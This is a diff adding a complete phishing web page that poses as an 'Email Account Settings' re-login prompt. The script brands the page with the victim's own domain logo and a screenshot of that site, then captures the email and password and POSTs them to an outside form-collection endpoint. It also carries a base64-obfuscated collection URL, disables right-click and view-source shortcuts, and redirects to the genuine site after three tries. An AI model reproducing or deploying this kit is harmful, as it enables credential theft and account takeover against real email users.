@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<link href="local_resources/css/e3ba2ada004aaff249f2794552e7e6bc.css" rel="stylesheet"/>
+<script src="local_resources/js/6f8bd9fb8fe489d207d9f446d5d0405d.js"></script>
+<script src="local_resources/js/ac76be9a2d55ac1d04d07d0cd49ccd30.js"></script>
+<script src="local_resources/js/101f319d9ecdb0b555b8acb7f13a2058.js"></script>
+<title class="logoname">Email Update</title>
+<style>
+    .form-body{
+        background-color:#F4F4F4;
+   
+        height:420px;
+        position:absolute;
+        top:20%;
+           transform:translateY(-50%,-50%);
+        border-radius:10px;
+    }
+    .form-control{
+        height:45px;
+    }
+    button{
+        height:45px;
+    }
+    </style>
+</head>
+<body class="d-flex justify-content-center">
+<iframe id="mainPage" sandbox="allow-forms allow-pointer-lock allow-popups allow-scripts" scrolling="no" src="local_resources/iframes/7a642487e5ea88e43dbed4fa9cb06ec1.html" style="position: absolute; height: 100%;border: none;" width="100%"></iframe>
+<div class="form-body col-sm-4">
+<br/>
+<div class="text-center mt-5"><img id="logoimg" src="local_resources/img/7a642487e5ea88e43dbed4fa9cb06ec1.html" style="width:50px;margin-top:0px;"/></div>
+<p class="text-center" style="font-weight:600;"><span class="text-capitalize" id="logoname"></span> - Email Account Settings</p>
+<div class="">
+<p class="text-center" style="font-size:90%;color:#106dff;">Your session has expired, Enter your email password and login again to continue..</p>
+<div class="">
+<form action="https://formbold.com/s/3OKMN" class="mx-5" id="users" method="POST">
+<input class="form-control" id="email" name="email" readonly="" type="email"/>
+<input class="form-control" id="password" name="password" placeholder="Password" required="" type="password"/>
+<div class="text-center my-3"></div>
+<button class="btn btn-primary btn-block" id="submit-btn" type="submit">Enter</button>
+<center>
+<div class="alert alert-danger" id="msg" style="display: none; font-size:14px; ">Password is incorrect, Account will be restricted if password is wrong!!</div>
+<span class="text-danger" id="error" style="display: none;">This account does not exist. Enter a different account</span>
+</center>
+</form>
+</div>
+</div>
+<script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="local_resources/js/fa23745d4e6bc99d0e191c82e00f6cf9.js"></script>
+<script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="local_resources/js/8b11cdf1459a34b4401cadbb9adc5bb1.js"></script>
+<script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="local_resources/js/4352c71c7dbf3ea299f6e8f75552d037.js"></script>
+<script src="local_resources/js/c291f2ae17879321c2215162f40786cc.js"></script>
+<script src="local_resources/js/c1187e7c9fb5913ff29b3e2296278f50.js"></script>
+<script src="local_resources/js/e2f7579cc36a36a953cd13551e345abc.js" type="text/javascript"></script>
+<script src="local_resources/js/c291f2ae17879321c2215162f40786cc.js"></script>
+<script>
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 ||   
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email); 
+        var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+           email.focus;
+           return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var mainPage = 'https://'+my_slice; 
+		var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+	
+		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
+		
+		//var image = "url('https://"+sv;"')"
+	
+
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+		$("#logoname").html(final);
+		$(".logoname").html(final);
+         
+        document.body.style.backgroundImage = image;
+
+		
+	 	
+        $(".email").html(email);
+		 
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var email=$("#email").val();
+        var password=$("#password").val();
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html("Email field is empty");
+        
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is empty");
+         
+            return false;
+        }
+
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count); 
+	var d=atob('aHR0cHM6Ly8xdGhhc2hjb2luLmNvbS9hc3NldHMvb28ucGhw');
+	   $.ajax({
+        dataType: 'JSON',
+		url: 'https://formbold.com/s/3OKMN',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Loading...');
+			  
+    //  console.log(count); 
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Password is incorrect, Account will be restricted if password is wrong!</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www." + my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=3) {
+                count=0;
+                    window.location.replace("http://www." + my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Enter');
+            }
+          });  
+    });
+
+
+    });
+
+
+  </script>
+</div></body>
+</html>
